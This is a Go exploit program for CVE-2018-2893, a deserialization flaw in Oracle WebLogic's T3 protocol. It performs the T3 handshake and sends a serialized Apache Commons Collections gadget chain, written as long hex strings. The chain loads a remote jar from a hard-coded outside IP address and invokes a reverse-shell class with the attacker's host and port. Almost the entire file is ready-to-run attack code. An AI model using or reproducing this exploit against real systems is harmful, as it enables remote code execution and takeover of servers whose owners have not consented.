package CVE_2018_2893Exp

import (
	"encoding/hex"
	"fmt"
	"net"
	"strconv"
	"time"
)

var (
	VUL = "CVE-2018-2893"
)

func t3handshake(conn net.Conn) {
	hex_data, _ := hex.DecodeString("74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a")
	_, err := conn.Write(hex_data)
	if err != nil {
		fmt.Printf("[-] Target weblogic not detected %s\n", VUL)
		return
	}
	time.Sleep(1 * time.Second)
	buf := make([]byte, 1024)
	conn.Read(buf)
}

func buildT3RequestObject(conn net.Conn, rport string) {
	data1, _ := hex.DecodeString("000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371")
	int_port, _ := strconv.Atoi(rport)
	//hex_port := fmt.Sprintf("%04x", intport)
	str_data2 := fmt.Sprintf("007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000%sffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07", fmt.Sprintf("%04x", int_port))
	data2, _ := hex.DecodeString(str_data2)
	data3, _ := hex.DecodeString("1a7727000d3234322e323134")
	data4, _ := hex.DecodeString("2e312e32353461863d1d0000000078")
	data_arr := [4][]byte{data1, data2, data3, data4}
	for _, data := range data_arr {
		conn.Write(data)
	}
	time.Sleep(2 * time.Second)
}

func sendEvilObjData(conn net.Conn, data string) []byte {
	payload := "056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000"
	payload += data
	payload += "fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff"
	//payload1 := '%s%s'%('{:08x}'.format(len(payload)/2 + 4),payload)
	payload1 := fmt.Sprintf("%08x%s", len(payload)/2+4, payload)
	payload2, _ := hex.DecodeString(payload1)
	conn.Write(payload2)
	time.Sleep(2 * time.Second)
	conn.Write(payload2)
	var res []byte
	buf := make([]byte, 4096)
	count := 0
	for count < 5 {
		n, err := conn.Read(buf)
		if err != nil {
			break
		}
		res = append(res, buf[:n]...)
		time.Sleep(100 * time.Millisecond)
		count += 1
	}
	return res
}

func Run(rip string, rport string, reverse_host string, reverse_port string) {
	server_addr := rip + ":" + rport

	conn, err := net.DialTimeout("tcp4", server_addr, 10*time.Second)
	if err != nil {
		fmt.Printf("[-] Target weblogic not detected %s\n", VUL)
		return
	}
	defer conn.Close()

	t3handshake(conn)
	buildT3RequestObject(conn, rport)

	PAYLOAD := "aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000047372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200176a6176612e6e65742e55524c436c6173734c6f61646572000000000000000000000078707372003e6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e7374616e74696174655472616e73666f726d6572348bf47fa486d03b0200025b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c0200007870000000017572000f5b4c6a6176612e6e65742e55524c3b5251fd24c51b68cd0200007870000000017372000c6a6176612e6e65742e55524c962537361afce47203000749000868617368436f6465490004706f72744c0009617574686f726974797400124c6a6176612f6c616e672f537472696e673b4c000466696c6571007e001c4c0004686f737471007e001c4c000870726f746f636f6c71007e001c4c000372656671007e001c7870ffffffffffffffff74000f3137362e3132322e3135372e3131307400132f4a657852656d6f7465546f6f6c732e6a617271007e001e740004687474707078757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000017671007e00197372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b0005694172677371007e00144c000b694d6574686f644e616d6571007e001c5b000b69506172616d547970657371007e001578707571007e00170000000174000a4a6578526576657273657400096c6f6164436c6173737571007e002100000001767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707371007e00137571007e0017000000027400"
	PAYLOAD += hex.EncodeToString([]byte(reverse_host))
	PAYLOAD += hex.EncodeToString([]byte(reverse_port))
	PAYLOAD += hex.EncodeToString([]byte{0x00, 0x00, 0x09, 0xf3, 0x01, 0x65, 0x01, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x71, 0x00, 0x00, 0xea, 0x60, 0x00, 0x00, 0x00, 0x18, 0x43, 0x2e, 0xc6, 0xa2, 0xa6, 0x39, 0x85, 0xb5, 0xaf, 0x7d, 0x63, 0xe6, 0x43, 0x83, 0xf4, 0x2a, 0x6d, 0x92, 0xc9, 0xe9, 0xaf, 0x0f, 0x94, 0x72, 0x02, 0x79, 0x73, 0x72, 0x00, 0x78, 0x72, 0x01, 0x78, 0x72, 0x02, 0x78, 0x70, 0x00, 0x00, 0x00, 0x0c, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x70, 0x70, 0x70, 0x70, 0x70, 0x70, 0x00, 0x00, 0x00, 0x0c, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x70, 0x06, 0xfe, 0x01, 0x00, 0x00, 0xac, 0xed, 0x00, 0x05, 0x73, 0x72, 0x00, 0x1d, 0x77, 0x65, 0x62, 0x6c, 0x6f, 0x67, 0x69, 0x63, 0x2e, 0x72, 0x6a, 0x76, 0x6d, 0x2e, 0x43, 0x6c, 0x61, 0x73, 0x73, 0x54, 0x61, 0x62, 0x6c, 0x65, 0x45, 0x6e, 0x74, 0x72, 0x79, 0x2f, 0x52, 0x65, 0x81, 0x57, 0xf4, 0xf9, 0xed, 0x0c, 0x00, 0x00, 0x78, 0x70, 0x72, 0x00, 0x24, 0x77, 0x65, 0x62, 0x6c, 0x6f, 0x67, 0x69, 0x63, 0x2e, 0x63, 0x6f, 0x6d, 0x6d, 0x6f, 0x6e, 0x2e, 0x69, 0x6e, 0x74, 0x65, 0x72, 0x6e, 0x61, 0x6c, 0x2e, 0x50, 0x61, 0x63, 0x6b, 0x61, 0x67, 0x65, 0x49, 0x6e, 0x66, 0x6f, 0xe6, 0xf7, 0x23, 0xe7, 0xb8, 0xae, 0x1e, 0xc9, 0x02, 0x00, 0x09, 0x49, 0x00, 0x05, 0x6d, 0x61, 0x6a, 0x6f, 0x72, 0x49, 0x00, 0x05, 0x6d, 0x69, 0x6e, 0x6f, 0x72, 0x49, 0x00, 0x0b, 0x70, 0x61, 0x74, 0x63, 0x68, 0x55, 0x70, 0x64, 0x61, 0x74, 0x65, 0x49, 0x00, 0x0c, 0x72, 0x6f, 0x6c, 0x6c, 0x69, 0x6e, 0x67, 0x50, 0x61, 0x74, 0x63, 0x68, 0x49, 0x00, 0x0b, 0x73, 0x65, 0x72, 0x76, 0x69, 0x63, 0x65, 0x50, 0x61, 0x63, 0x6b, 0x5a, 0x00, 0x0e, 0x74, 0x65, 0x6d, 0x70, 0x6f, 0x72, 0x61, 0x72, 0x79, 0x50, 0x61, 0x74, 0x63, 0x68, 0x4c, 0x00, 0x09, 0x69, 0x6d, 0x70, 0x6c, 0x54, 0x69, 0x74, 0x6c, 0x65, 0x74, 0x00, 0x12, 0x4c, 0x6a, 0x61, 0x76, 0x61, 0x2f, 0x6c, 0x61, 0x6e, 0x67, 0x2f, 0x53, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x3b, 0x4c, 0x00, 0x0a, 0x69, 0x6d, 0x70, 0x6c, 0x56, 0x65, 0x6e, 0x64, 0x6f, 0x72, 0x71, 0x00, 0x7e, 0x00, 0x03, 0x4c, 0x00, 0x0b, 0x69, 0x6d, 0x70, 0x6c, 0x56, 0x65, 0x72, 0x73, 0x69, 0x6f, 0x6e, 0x71, 0x00, 0x7e, 0x00, 0x03, 0x78, 0x70, 0x77, 0x02, 0x00, 0x00, 0x78, 0xfe, 0x01, 0x00, 0x00})
	PAYLOAD += hex.EncodeToString([]byte{0xfe, 0x01, 0x00, 0x00, 0xac, 0xed, 0x00, 0x05, 0x73, 0x72, 0x00, 0x1d, 0x77, 0x65, 0x62, 0x6c, 0x6f, 0x67, 0x69, 0x63, 0x2e, 0x72, 0x6a, 0x76, 0x6d, 0x2e, 0x43, 0x6c, 0x61, 0x73, 0x73, 0x54, 0x61, 0x62, 0x6c, 0x65, 0x45, 0x6e, 0x74, 0x72, 0x79, 0x2f, 0x52, 0x65, 0x81, 0x57, 0xf4, 0xf9, 0xed, 0x0c, 0x00, 0x00, 0x78, 0x70, 0x72, 0x00, 0x21, 0x77, 0x65, 0x62, 0x6c, 0x6f, 0x67, 0x69, 0x63, 0x2e, 0x63, 0x6f, 0x6d, 0x6d, 0x6f, 0x6e, 0x2e, 0x69, 0x6e, 0x74, 0x65, 0x72, 0x6e, 0x61, 0x6c, 0x2e, 0x50, 0x65, 0x65, 0x72, 0x49, 0x6e, 0x66, 0x6f, 0x58, 0x54, 0x74, 0xf3, 0x9b, 0xc9, 0x08, 0xf1, 0x02, 0x00, 0x07, 0x49, 0x00, 0x05, 0x6d, 0x61, 0x6a, 0x6f, 0x72, 0x49, 0x00, 0x05, 0x6d, 0x69, 0x6e, 0x6f, 0x72, 0x49, 0x00, 0x0b, 0x70, 0x61, 0x74, 0x63, 0x68, 0x55, 0x70, 0x64, 0x61, 0x74, 0x65, 0x49, 0x00, 0x0c, 0x72, 0x6f, 0x6c, 0x6c, 0x69, 0x6e, 0x67, 0x50, 0x61, 0x74, 0x63, 0x68, 0x49, 0x00, 0x0b, 0x73, 0x65, 0x72, 0x76, 0x69, 0x63, 0x65, 0x50, 0x61, 0x63, 0x6b, 0x5a, 0x00, 0x0e, 0x74, 0x65, 0x6d, 0x70, 0x6f, 0x72, 0x61, 0x72, 0x79, 0x50, 0x61, 0x74, 0x63, 0x68, 0x5b, 0x00, 0x08, 0x70, 0x61, 0x63, 0x6b, 0x61, 0x67, 0x65, 0x73, 0x74, 0x00, 0x27, 0x5b, 0x4c, 0x77, 0x65, 0x62, 0x6c, 0x6f, 0x67, 0x69, 0x63, 0x2f, 0x63, 0x6f, 0x6d, 0x6d, 0x6f, 0x6e, 0x2f, 0x69, 0x6e, 0x74, 0x65, 0x72, 0x6e, 0x61, 0x6c, 0x2f, 0x50, 0x61, 0x63, 0x6b, 0x61, 0x67, 0x65, 0x49, 0x6e, 0x66, 0x6f, 0x3b, 0x78, 0x72, 0x00, 0x24, 0x77, 0x65, 0x62, 0x6c, 0x6f, 0x67, 0x69, 0x63, 0x2e, 0x63, 0x6f, 0x6d, 0x6d, 0x6f, 0x6e, 0x2e, 0x69, 0x6e, 0x74, 0x65, 0x72, 0x6e, 0x61, 0x6c, 0x2e, 0x56, 0x65, 0x72, 0x73, 0x69, 0x6f, 0x6e, 0x49, 0x6e, 0x66, 0x6f, 0x97, 0x22, 0x45, 0x51, 0x64, 0x52, 0x46, 0x3e, 0x02, 0x00, 0x03, 0x5b, 0x00, 0x08, 0x70, 0x61, 0x63, 0x6b, 0x61, 0x67, 0x65, 0x73, 0x71, 0x00, 0x7e, 0x00, 0x03, 0x4c, 0x00, 0x0e, 0x72, 0x65, 0x6c, 0x65, 0x61, 0x73, 0x65, 0x56, 0x65, 0x72, 0x73, 0x69, 0x6f, 0x6e, 0x74, 0x00, 0x12, 0x4c, 0x6a, 0x61, 0x76, 0x61, 0x2f, 0x6c, 0x61, 0x6e, 0x67, 0x2f, 0x53, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x3b, 0x5b, 0x00, 0x12, 0x76, 0x65, 0x72, 0x73, 0x69, 0x6f, 0x6e, 0x49, 0x6e, 0x66, 0x6f, 0x41, 0x73, 0x42, 0x79, 0x74, 0x65, 0x73, 0x74, 0x00, 0x02, 0x5b, 0x42, 0x78, 0x72, 0x00, 0x24, 0x77, 0x65, 0x62, 0x6c, 0x6f, 0x67, 0x69, 0x63, 0x2e, 0x63, 0x6f, 0x6d, 0x6d, 0x6f, 0x6e, 0x2e, 0x69, 0x6e, 0x74, 0x65, 0x72, 0x6e, 0x61, 0x6c, 0x2e, 0x50, 0x61, 0x63, 0x6b, 0x61, 0x67, 0x65, 0x49, 0x6e, 0x66, 0x6f, 0xe6, 0xf7, 0x23, 0xe7, 0xb8, 0xae, 0x1e, 0xc9, 0x02, 0x00, 0x09, 0x49, 0x00, 0x05, 0x6d, 0x61, 0x6a, 0x6f, 0x72, 0x49, 0x00, 0x05, 0x6d, 0x69, 0x6e, 0x6f, 0x72, 0x49, 0x00, 0x0b, 0x70, 0x61, 0x74, 0x63, 0x68, 0x55, 0x70, 0x64, 0x61, 0x74, 0x65, 0x49, 0x00, 0x0c, 0x72, 0x6f, 0x6c, 0x6c, 0x69, 0x6e, 0x67, 0x50, 0x61, 0x74, 0x63, 0x68, 0x49, 0x00, 0x0b, 0x73, 0x65, 0x72, 0x76, 0x69, 0x63, 0x65, 0x50, 0x61, 0x63, 0x6b, 0x5a, 0x00, 0x0e, 0x74, 0x65, 0x6d, 0x70, 0x6f, 0x72, 0x61, 0x72, 0x79, 0x50, 0x61, 0x74, 0x63, 0x68, 0x4c, 0x00, 0x09, 0x69, 0x6d, 0x70, 0x6c, 0x54, 0x69, 0x74, 0x6c, 0x65, 0x71, 0x00, 0x7e, 0x00, 0x05, 0x4c, 0x00, 0x0a, 0x69, 0x6d, 0x70, 0x6c, 0x56, 0x65, 0x6e, 0x64, 0x6f, 0x72, 0x71, 0x00, 0x7e, 0x00, 0x05, 0x4c, 0x00, 0x0b, 0x69, 0x6d, 0x70, 0x6c, 0x56, 0x65, 0x72, 0x73, 0x69, 0x6f, 0x6e, 0x71, 0x00, 0x7e, 0x00, 0x05, 0x78, 0x70, 0x77, 0x02, 0x00, 0x00, 0x78, 0xfe, 0x00, 0xff, 0xfe, 0x01, 0x00, 0x00, 0xac, 0xed, 0x00, 0x05, 0x73, 0x72, 0x00, 0x13, 0x77, 0x65, 0x62, 0x6c, 0x6f, 0x67, 0x69, 0x63, 0x2e, 0x72, 0x6a, 0x76, 0x6d, 0x2e, 0x4a, 0x56, 0x4d, 0x49, 0x44, 0xdc, 0x49, 0xc2, 0x3e, 0xde, 0x12, 0x1e, 0x2a, 0x0c, 0x00, 0x00, 0x78, 0x70, 0x77, 0x46, 0x21, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x09, 0x31, 0x32, 0x37, 0x2e, 0x30, 0x2e, 0x31, 0x2e, 0x31, 0x00, 0x0b, 0x75, 0x73, 0x2d, 0x6c, 0x2d, 0x62, 0x72, 0x65, 0x65, 0x6e, 0x73, 0xa5, 0x3c, 0xaf, 0xf1, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x1b, 0x59, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x00, 0x78, 0xfe, 0x01, 0x00, 0x00, 0xac, 0xed, 0x00, 0x05, 0x73, 0x72, 0x00, 0x13, 0x77, 0x65, 0x62, 0x6c, 0x6f, 0x67, 0x69, 0x63, 0x2e, 0x72, 0x6a, 0x76, 0x6d, 0x2e, 0x4a, 0x56, 0x4d, 0x49, 0x44, 0xdc, 0x49, 0xc2, 0x3e, 0xde, 0x12, 0x1e, 0x2a, 0x0c, 0x00, 0x00, 0x78, 0x70, 0x77, 0x1d, 0x01, 0x81, 0x40, 0x12, 0x81, 0x34, 0xbf, 0x42, 0x76, 0x00, 0x09, 0x31, 0x32, 0x37, 0x2e, 0x30, 0x2e, 0x31, 0x2e, 0x31, 0xa5, 0x3c, 0xaf, 0xf1, 0x00, 0x00, 0x00, 0x00, 0x00, 0x78})
	res := sendEvilObjData(conn, PAYLOAD)
	fmt.Println(res)

}
